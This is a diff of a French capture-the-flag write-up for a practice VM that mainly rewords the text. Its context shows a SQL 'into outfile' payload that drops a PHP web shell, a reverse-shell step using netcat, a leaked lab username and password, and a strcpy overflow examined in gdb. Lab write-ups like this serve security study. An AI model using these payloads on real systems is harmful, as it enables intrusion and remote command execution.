@@ -41,7 +41,6 @@ Best regards.
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 - En regardant le forum type de sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
-- Je creer donc un fichier avec un reverse shell pour que se soit plus facile et je creer un serveur en local avec netcat
 - Dans les home un dossier est presant LOOKATME qui contient un dossier password
 ```
 lmezard:G!@M6f4Eatau{sF"
@@ -54,7 +53,7 @@ lmezard:G!@M6f4Eatau{sF"
 ```
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
-- On remarque que le fichier fun est une archive de plusieurs fichiers donc on le decompresse avec `tar -xf fun`
+- On remarque que le fichier fun est une archive de plusieurs fichiers, on le decompresse donc avec `tar -xf fun`
 ```
 $> file fun 
 fun: POSIX tar archive (GNU)
@@ -207,7 +206,7 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 ## Zaz & Root
-- On voit qu'il y a un strcpy de argv[1] donc on peut l'overflow
+- On voit qu'il y a un strcpy de argv[1], le programme peut donc etre overflow
 ```
 $> ltrace ./exploit_me testt
 __libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
@@ -215,7 +214,7 @@ strcpy(0xbffff5e0, "testt")                                            = 0xbffff
 puts("testt"testt)                                                     = 6
 +++ exited (status 0) +++
 ```
-- On calcule donc l'offset
+- On calcule l'offset
 <pre>
 zaz@BornToSecHackMe:~$ gdb ./exploit_me 
 (gdb) source /tmp/peda/peda.py 
